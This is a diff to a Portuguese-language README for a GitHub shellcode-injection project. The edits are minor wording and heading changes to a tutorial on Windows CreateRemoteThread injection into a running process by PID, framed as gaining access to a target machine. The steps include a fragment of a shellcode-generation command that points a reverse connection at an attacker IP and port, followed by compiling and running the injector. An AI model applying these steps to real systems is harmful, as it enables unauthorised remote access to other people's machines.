@@ -9,12 +9,13 @@ https://github.com/d0x75/Injector-RemoteProcess.git
 
 **Windows CreateRemoteThread Shellcode Injection and Execution in Remote Process**
 
->Esse também é um o clássico Shellcode Injection que no caso é feito em outro módulo/processo que está em execução no computador alvo. O PID do processo que injetaremos o código é passado como argumento ao executarmos o shellcode.
+>Essa também é uma o clássica Injeção de Shellcode que
+no caso é feito em outro módulo/processo que está em execução no computador alvo. O PID do módulo/processo é a referencia que utilizamos para injetar o shellcode.
 
->Quando o shellcode for executado com sucesso, ganhamos acesso na máquina alvo; Conforme PoC a seguir:
+>Quando o shellcode for executado com sucesso, ganhamos acesso na máquina alvo; Conforme a seguir :
 
 
-### Step 1 
+#### Step 1
 
 - Gerar os bytes do shellcode para Windows x86, apontando para o IP do computador que vai ganhar o acesso.
 
@@ -66,7 +67,7 @@ LHOST=192.168.10.113 LPORT=1234 -f c -b \x00\x0a\x0d
 ```
 
 
-### Step 2
+#### Step 2
 
 - Abrir o código do link mencionado no inicio, que tem o
 código responsável por executar os bytes gerados acima.
@@ -86,7 +87,7 @@ _unsigned char shellcode[] = ""_ do código fonte , e depois compilar-lo.
 injectremotePID.exe
 ```
 
-### Step 3
+#### Step 3
 
 - Anotar o PID do processo/módulo em que iremos injetar o shellcode.
 
